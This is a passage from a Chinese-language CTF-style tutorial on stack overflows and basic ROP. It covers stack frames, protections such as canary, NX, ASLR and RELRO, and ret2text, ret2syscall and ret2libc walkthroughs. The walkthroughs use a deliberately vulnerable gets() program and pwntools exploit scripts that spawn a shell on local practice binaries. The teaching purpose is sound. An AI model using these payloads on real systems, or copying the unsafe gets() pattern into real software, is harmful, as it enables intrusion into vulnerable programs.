|<br>其中，主调函数将参数按照调用约定依次入栈(图中为从右到左)，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。</p><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/5279b466-d0fc-4fa4-a5b6-c916dfde7283.png" alt="alt text"><br><strong>注：</strong></p><ul><li>x86:函数参数在函数返回地址的上方</li><li>X64:System V AMD64 ABI(Linux, FreeBSD,macos等采用)中前六个整形或指针参数依次保存在RDI,RSI,RDX,RCX,R8和R9寄存器中，如果还有更多的参数的话才会保存在栈上。且内存地址不能大于<strong>0x00007FFFFFFFFFFF</strong>，6个字节长度，否则会抛出异常。</li></ul><h4 id="函数调用约定">函数调用约定</h4><p>创建一个栈帧的最重要步骤是主调函数如何向栈中传递函数参数。主调函数必须精确存储这些参数，以便被调函数能够访问到他们。函数通过选择特定的调用约定，来表明其希望以特定方式接受参数。此外，调用约定规定先前入栈的参数由主调函数还是被调函数负责清除，以保证程序的栈顶指针完整性。<br>函数调用约定通常规定：</p><ol><li>函数参数的传递顺序和方式：</li><li>栈的维护方式</li><li>名字修饰(Name-mangling)策略</li></ol><p>常见调用约定：</p><ol><li>cdecl调用约定</li><li>stdcall调用约定（微软命名）</li><li>fastcall调用约定</li><li>thiscall调用约定</li><li>naked call调用约定</li><li>pascal调用约定</li></ol><h3 id="栈溢出原理">栈溢出原理</h3><p>介绍：栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的<strong>缓冲区溢出漏洞</strong><br>发生栈溢出的基本前提是：</p><ul><li>程序必须向栈上写入数据。</li><li>写入的数据大小没有被良好的控制</li></ul><p>**tips：**缓冲区溢出漏洞</p><p>缓冲区溢出漏洞是指程序在运行时，向固定大小的缓冲区写入超过其容量的数据，多余的数据会越过缓冲区的边界覆盖相邻内存空间，造成缓冲区溢出。攻击者回利用该漏洞，向未控制用户输入的程序填入超过缓冲区容量的字节数量，以覆盖相邻内存空间的返回地址、函数指针、堆管理结构等合法数据，从而使程序运行失败，或者转向执行其他程序代码，预先注入到内存缓冲区的代码。缓冲区溢出后执行的代码，会以原有程序的身份权限运行。<br>引发缓冲区溢出的原因是缺乏类型安全功能的程序设计语言。出于效率的考虑，部分函数不对数组边界条件和函数指针引用等进行边界检查。例如：<strong>strcpy()</strong>,<strong>strcat</strong>,<strong>sprintf</strong>,**gets()**等函数中，数组和指针都没有自动进行边界检查。<br>缓冲区溢出不是一种漏洞，而是一类漏洞。常见的缓冲区溢出漏洞包括：</p><ul><li>栈溢出漏洞</li><li>堆溢出漏洞</li><li>整数溢出漏洞</li><li>SHE结构基础漏洞</li><li>单字节溢出漏洞</li><li>格式化字符串漏洞</li><li>C++虚函数漏洞</li></ul><p>基本示例：最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，**当然需要确保这个地址所在的段具有可执行权限。**例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">(<span class="type">void</span>)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">(<span class="type">void</span>)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="type">char</span> s[<span class="number">12</span>];  </span><br><span class="line">  </span><br><span class="line">    gets(s);  </span><br><span class="line">    <span class="built_in">puts</span>(s);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    vulnerable();  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段程序明显可以看出，只是接受字符串，然后打印出来，也就是说，唯一调用的其实只有main函数与vulnerable函数，但是，我们希望可以控制程序执行success函数。<br>我们使用<code>gcc -m32 -fno-stack-protector stack_example.c -o stack_example</code>来编译该文件，可以看到，编译器发出警告。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/438aaa8b-17cf-4707-ba87-fb45de3d8b95.png" alt="alt text"><br>可以看到gets本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出。<br>上述指令中，<code>-m32</code>指生成32位程序；<code>-fno-stack-protector</code>指的是不开启堆栈溢出保护，即不生成<strong>canary</strong>，此外，避免开启pie(Position Independent Executable)，防止加载基址被打乱。不同gcc版本对于PIE的默认配置不同，我们可以使用<code>gcc -v</code>查看gcc默认的开关情况。如果含有<code>--enable-default-pie</code>参数，则需要在编译指令中添加<code>-no-pie</code>关闭。<br>使用checksec检查文件开启的保护：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/c56a252a-105b-4fbe-a58d-fbc8da486b34.png" alt="alt text"><br>可以看到，程序为32位，且开启了PIE保护，我们使用<code>-no-pie</code>重新编译一下<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/7e216260-0c0e-4caa-9f9b-f2e17d788f91.png" alt="alt text"><br>提到编译时的PIE保护，Linux平台下还有地址空间分布随机化(ASLR)的机制。简单来说即使可执行文件开启了PIE保护，还需要系统开启ASLR才会真正打乱基地址，否则程序运行时依旧会在加载一个固定的基址上（不过和No PIE时基址不同）。我们可以通过修改<code>/proc/sys/kernel/randomize_va_space</code>来控制ASLR启动与否，具体选项有：</p><ul><li>0，关闭ASLR，没有随机化。栈，堆，.so的基地址每次都相同。</li><li>1，普通的ASLR。栈基地址、mmap基地址、.so加载基地址都将被随机化，但是堆基地址没有随机化。</li><li>2，增强的ASLR，在1的基础上，增加了堆基地址随机化。<br>我们这里修改并查看：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/b0e678f7-d111-4a84-a4af-4081c980894a.png" alt="alt text"><br>现在，我们可以使用IDA来进行静态分析我们的程序：<br>进入<code>vulnerable</code>函数中</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span>  </span><br><span class="line">&#123;  </span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-14h] BYREF  </span></span><br><span class="line">  </span><br><span class="line">  gets(s);  </span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，字符串距离ebp的长度是0x14。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/b54faab0-7071-4c6f-9d99-67416740f4a1.png" alt="alt text"><br>那么相应的栈结构为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+  </span><br><span class="line">             |     retaddr     |  </span><br><span class="line">             +-----------------+  </span><br><span class="line">             |     saved ebp   |  </span><br><span class="line">      ebp---&gt;+-----------------+  </span><br><span class="line">             |                 |  </span><br><span class="line">             |                 |  </span><br><span class="line">             |                 |  </span><br><span class="line">             |                 |  </span><br><span class="line">             |                 |  </span><br><span class="line">             |                 |  </span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure><p>我们继续获取到success的地址：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/d8ea2499-491f-414a-941e-329e8bd68915.png" alt="alt text"><br>那么如果我们输入的字符串为</p><p><code>0x14*'a' + 'bbbb' + success_addr</code></p><p>因为gets()函数读到回车才算结束，那么我们可以直接读取所有的字符串，并且将saved edp覆盖为bbbb，将retaddr覆盖为success_addr，即，此时的栈结构为：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+  </span><br><span class="line">             |    0x0804843B   |  </span><br><span class="line">             +-----------------+  </span><br><span class="line">             |       bbbb      |  </span><br><span class="line">      ebp---&gt;+-----------------+  </span><br><span class="line">             |                 |  </span><br><span class="line">             |                 |  </span><br><span class="line">             |                 |  </span><br><span class="line">             |                 |  </span><br><span class="line">             |                 |  </span><br><span class="line">             |                 |  </span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure><p>我们利用pwntools来编写exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./stack_example&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">success_addr = <span class="number">0x08049186</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="number">0x14</span> * <span class="string">b&#x27;a&#x27;</span> + <span class="string">b&#x27;bbbb&#x27;</span> + p32(success_addr)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(p32(success_addr))  </span><br><span class="line"><span class="built_in">print</span>(payload)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/478311be-8b89-4b8e-ab67-0040b407e3f4.png" alt="alt text"><br>可以看到，成功执行了success函数。</p><h4 id="小结">小结</h4><p>第一步：<strong>寻找危险函数</strong><br>通过寻找危险函数，我们可以快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下：</p><ul><li>输入<ul><li>gets，直接读取一行，忽略<code>\x00</code></li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到<code>\x00</code>停止</li><li>strcat，字符串拼接，遇到<code>\x00</code>停止</li><li>bcopy</li></ul></li></ul><p>第二步：<strong>确定填充长度</strong><br>这一部分主要计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p><ul><li><p>相对于栈基地址的索引，可以直接通过查看EBP相对偏移获得</p></li><li><p>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型</p></li><li><p>直接地址索引，就相当于直接给定了地址。<br>一般来说，我们会有如下的覆盖需求</p></li><li><p><strong>覆盖函数返回地址</strong>，直接看EBP即可</p></li><li><p><strong>覆盖栈上某个变量的内容</strong>，需要更加精细的计算</p></li><li><p><strong>覆盖bss段某个变量的内容</strong>。</p></li><li><p>根据现实执行情况，覆盖特定的变量或地址的内容</p></li></ul><p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p><h3 id="基本ROP">基本ROP</h3><p>随着NX(Non-eXecutable)保护的开启，传统的直接向栈或者堆上直接注入代码的方式难以继续发挥效果，由此攻击者们也提出相应的办法来绕过保护。<br>目前被广泛使用的攻击守法是<strong>返回导向编程</strong>(Return Oriented Programming)，其主要思想是在**栈缓冲区溢出的基础上，利用程序中已有的小片段(<code>gadgets</code>)来改变某些寄存器或者变量的值，从而控制程序的执行流程。<br><code>gadgets</code>通常是以<code>ret</code>结尾的指令序列，通过这样的指令序列，我们可以多次劫持程序控制流，从而运行特定的指令序列，以完成攻击的目的。<br>返回导向编程这一名称的由来是因为其核心在于利用了指令集中的<code>ret</code>指令，从而改变了指令流的执行顺序，并通过数条<code>gadgets</code>“执行”了一个新程序。<br>使用ROP攻击一般得满足如下条件：</p><ul><li>程序漏洞允许我们劫持控制流，并控制后续的返回地址。</li><li>可以找到满足条件的<code>gadgets</code>以及相应<code>gadgets</code>的地址。</li></ul><p>作为一项基本的攻击手段，ROP攻击并不局限与栈溢出漏洞，也被广泛应用在堆溢出等各类漏洞的利用当中。<br>当系统开启<code>ASLR(地址随机化保护)</code>时，意味着<code>gadgets</code>在内存中的位置往往是不固定的。但幸运的是其相对于对应段基址的偏移通常是固定的，因此我们在寻找到了合适的<code>gadgets</code>之后可以通过其他方式泄露程序运行环境信息，从而计算出<code>gadgets</code>在内存中的真正地址。</p><h4 id="ret2text">ret2text</h4><h5 id="原理">原理</h5><p>ret2text即控制程序执行程序本身已有的代码(即，<code>.text</code>段中的代码)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是<code>gadgets</code>)，这也就是说我们所说的<code>ROP</code>。<br>这时，我们需要知道对应返回代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。<br><strong>栈溢出的几种保护机制</strong>：<br>参考: <a href="https://blog.csdn.net/ATFWUS/article/details/104552315">帧溢出的几种保护机制</a></p><ol><li>Stack Protector（栈保护）<br>也称<code>canary</code>，当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息（在linux中称cookie信息为canary），当函数真正返回的时候会验证cookie信息是否合法，如果不合法，则推出运行，当攻击者覆盖返回地址时会将canary覆盖掉，倒是栈保护检查失败，从而防范shellcode的执行，以此达到防护栈溢出的目的。其原理实在一个函数的入口处，先从<code>fs/gs</code>寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上，当函数结束时会检查这个栈上的值是否和存进去的值一致。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/b75dad09-ef8e-40ee-a78d-ed2b5c67a4b6.png" alt="alt text"></li><li>NX(DEP)（堆栈不可执行）<br>NX(DEP)的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。（等同于Windows下的DEP）。<br>gcc编译器默认开启NX选项，<code>-z execstack / -z noexecstack</code>(关闭 / 开启)</li><li>PIE(ASLR)（内存地址随机化）<br>标准的可执行程序需要固定的地址，并且只有被装载到这个地址才能正确执行，PIE能使程序像共享库一样在主存任何位置装载，这需要将程序编译成位置无关，并链接为ELF共享对象。通常NX和地址空间分布随机化(ASLR)会同时工作。<br><code>-no-pie / -pie(关闭 / 开启)</code></li><li>RELRO<br>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT(Global Offset Table)攻击。RELRO为<code>Partial RELRO</code>，说明对GOT表具有写权限。<br><code>-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)</code></li></ol><h6 id="例子">例子</h6><p>拿到题目，首先使用checksec检查下保护<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/0a2fe37a-f58b-4801-9491-b37bba8ecb24.png" alt="alt text"><br>开启了栈不可执行保护，使用ida打开<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/3f388302-7184-4299-982c-fdcbded8669a.png" alt="alt text"><br>看到存在gets()函数，该函数是高危函数，存在栈溢出。C 库函数<code>char *gets(char *str)</code>从标准输入 <code>stdin </code>读取一行，并把它存储在 <code>str</code>所指向的字符串中。当读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。<br><code>shift+f12</code>发现后门函数<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/0018b7a4-7472-4ba5-9e0f-e149a5126358.png" alt="alt text"><br>发现在secure函数中，获得后门地址<code>0x0804863A</code>,接下来我们需要确定能控制的内存的其实距离距离main函数的返回地址的字节数。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/fc130d2e-f185-4c91-bb23-58150c8ed404.png" alt="alt text"><br>可以看到s是通过相对于esp的索引，所以我们需要进行调试，将断点下在call处，查看esp，ebp。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/440bfaee-5473-4cd3-a059-ea48f96eb314.png" alt="alt text"><br>这里esp的地址为<code>0xffffd510</code>，ebp的地址为<code>0xffffd598</code>，s相对esp地址的索引为<code>esp+0x80h+s</code>,并且S的地址为<code>-0x64</code>，所以这里的索引为<code>esp+0x1c</code>,所以我们可以推断：</p><ul><li>s的地址为<code>0xffffd52c</code></li><li>s相对于ebp的偏移<code>0x6c</code></li><li>s相对返回地址的偏移为<code>0x6c+4</code></li></ul><p>编写pyload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./ret2text&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">success_addr = <span class="number">0x0804863A</span>  </span><br><span class="line">  </span><br><span class="line">payload = (<span class="number">0x6c</span> + <span class="number">4</span>) * <span class="string">b&quot;a&quot;</span> + p32(success_addr)  </span><br><span class="line">  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/4ee3f77f-a93a-4488-9ab5-7965ed0d8ef8.png" alt="alt text"><br>成功打通。</p><h4 id="ret2shellcode">ret2shellcode</h4><p><strong>原理</strong>：<br>ret2shellcode，即控制程序执行shellcode代码。shellcode值得是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell。<strong>通常情况下，shellcode需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码。</strong><br>在栈溢出的基础上，要想执行shellcode，需要在对应binary在运行时，shellcode所在的区域具有可执行权限。<br>需要注意的是，<strong>在新版内核当中引入了较为激进的保护策略，程序中通常不再默认有同时具有可写与可执行的段，这使得传统的ret2shellcode手法不再能直接完成利用。</strong></p><h4 id="ret2syscall">ret2syscall</h4><p><strong>原理</strong>：<br>控制程序执行系统调用，获取shell</p><p><strong>例子</strong>：<br>使用checksec先查保护<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/6e63fe36-2174-4cb6-89f0-3284a24f1bf8.png" alt="alt text"><br>32位程序并开启了nx保护。接下来拖到ida中进行分析。<br>f5反编译，审计，发现存在有gets危险函数，是一个栈溢出漏洞。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/05199c75-5fba-4e69-9f4b-a35867ef2ef5.png" alt="alt text"><br>继续分析：v4相对于esp的索引为<code>0x1c</code>，通过gdb调试计算发现，v4相对ebp的偏移为<code>0x6c</code>，v4的返回地址为<code>0x6c+4</code>。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/e1580471-365f-4834-8211-d3cdf488f6c5.png" alt="alt text"><br>由于程序中不存在直接的后门函数，所以我们不能直接利用程序中的某一段代码或者自己填写代码来获得shell，所以我们利用程序中的gadgets来获取shell，而对应的shell获取则是利用系统调用。<br><strong>系统调用(system call)</strong>：指运行在用户空间的程序向操作系统内核请求需要更高权限运行的服务。这些服务可能包含访问文件系统、创建和销毁进程、进程间通信和内存分配。系统调用在进程和作系统之间提供了一个重要的接口。系统调用提供用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态进行。<br>操作系统的进程空间可分为用户空间和内核空间，它们需要不同的执行权限。其中系统调用运行在内核空间。<br>系统调用和普通库函数调用非常相似，只是系统调用由操作系统内核提供，运行于内核核心态，而普通的库函数调用由库函数库或用户自己提供，运行于用户态。<br>linux在x86上的系统调用通过<code>int 80h</code>实现，用系统调用号来区分入口函数。操作系统实现系统调用的基本过程是：</p><ol><li>应用程序调用库函数(api)</li><li>API将系统调用号存入eax，然后通过中断调用使系统进入内核态</li><li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）</li><li>系统调用完成相应功能，将返回值存入eax，返回到中断处理函数</li><li>中断处理函数返回到api中</li><li>api将eax返回给应用程序。</li></ol><p>应用程序调用系统调用的过程是：</p><ol><li>把系统调用的编号存入eax</li><li>把函数参数存入其他通用寄存器</li><li>触发<code>0x80</code>号中断(<code>int 0x80</code>)</li></ol><p>所以，只要我们把对应获取shell的系统调用的参数放到对应的寄存器中，那么我们在执行<code>int 0x80</code>就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取shell：<br><code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code><br>其中，该程序为32位，所以我们需要使得：</p><ul><li>系统调用号，即eax为0xb</li><li>第一个参数，即ebx应该指向<code>/bin/sh</code>，其实执行sh的地址也可以。</li><li>第二个参数，即ecx应为0</li><li>第三个参数，即edx应为0</li></ul><p>我们如何控制这些寄存器的值，就需要使用到gadgets。比如说，现在栈顶是10，那么如果此时执行了pop eax，那么现在eax的值为10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在gadgets最后使用ret来再次控制程序执行流程的原因。具体寻找gadgets的方法，我们可以使用ropgadgets这个工具。</p><p>首先，我们来寻找控制eax的gadgets。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/14d55e48-e126-47f8-8f18-dd03136a3272.png" alt="alt text"><br>可以看到有上述几个都可以控制eax，选取第二个来做为gadgets。<br>类似的，我们可以得到控制其他寄存器的gadgets。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/fc2769e4-fa59-4ded-b28e-34c155038656.png" alt="alt text"><br>这里选择<br><code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code><br>因为这个可以直接控制其他三个寄存器。<br>此外，我们需要获得/bin/sh字符串的地址：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/67067351-090c-4831-aea6-868b06d6ef35.png" alt="alt text"><br>地址为：<code>0x080be408</code><br>还有<code>int 0x80</code>的地址：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/6a0bb3d1-a01b-4dbf-80ed-209cf630aa3f.png" alt="alt text"><br>地址为<code>0x08049421</code><br>接下来，我们进行exp的编写，其中oxb为execve对应的系统调用号。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span>  </span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span>  </span><br><span class="line">int_0x80 = <span class="number">0x08049421</span>  </span><br><span class="line">binsh = <span class="number">0x080be408</span>  </span><br><span class="line">payload = flat(  </span><br><span class="line">    [<span class="string">&#x27;A&#x27;</span> * (<span class="number">0x6c</span> + <span class="number">4</span>), pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80]  </span><br><span class="line">)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>成功拿到shell<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/e0f36124-66a6-45f5-a3d0-2efe1698ea4f.png" alt="alt text"></p><h4 id="ret2libc">ret2libc</h4><p><strong>原理</strong>：<br>ret2libc即控制函数的执行libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置（即函数对应的got表项的内容），一般情况下，我们会选择执行<code>system(&quot;/bin/sh&quot;)</code>，故而此时我们需要知道system函数的地址。</p><h5 id="plt、got表">plt、got表</h5><p>plt表(Procedure Linkage Table,过程链接表)：是linux ELF文件中用于延迟绑定的表，即函数第一次被调用的时候才进行绑定。<br>got表(Global Offset Table,全局偏移表)：是linux ELF文件中用于定位全局变量和函数的一个表。<br>在第一次调用函数的时候，程序会首先跳转到plt表中，然后再跳转到got表中，因为函数是第一次调用，就会跳转回到plt表中，执行<code>patch ***@got</code>，将函数的真实地址填充到got，然后执行代码，当下一次再调用函数时，plt-&gt;got-&gt;地址<br><a href="https://introspelliam.github.io/2017/08/03/pwn/got%E3%80%81plt%E8%A1%A8%E4%BB%8B%E7%BB%8D/">got、plt表介绍</a></p><p><strong>例子</strong>：<br>老规矩，拿到题目先查保护：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/c058a11f-24bf-45d0-8b11-5c9a2d176cc4.png" alt="alt text"><br>程序为32位，并且开启了NX保护。使用ida进行反编译<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/757c335e-90e2-4d1d-830c-87dcbe980f93.png" alt="alt text"><br>gets危险函数，标准的栈溢出漏洞。利用ROPgadget查找<code>/bin/sh</code>是否存在。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/4da2fb6d-6f5b-4cbd-a0ca-83ce04e8ae62.png" alt="alt text"><br>接下来，我们查找system函数是否存在：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/79c8624e-21ec-42e9-bbed-257a02a16a22.png" alt="alt text"><br>接下来，我们可以直接返回到该地址，执行system函数。<br>编写exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./ret2libc1&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">binsh_addr = <span class="number">0x08048720</span>  </span><br><span class="line">system_plt = <span class="number">0x08048460</span>  </span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/6275991d-20a7-411f-90d8-ba2ddb4ca8a4.png" alt="alt 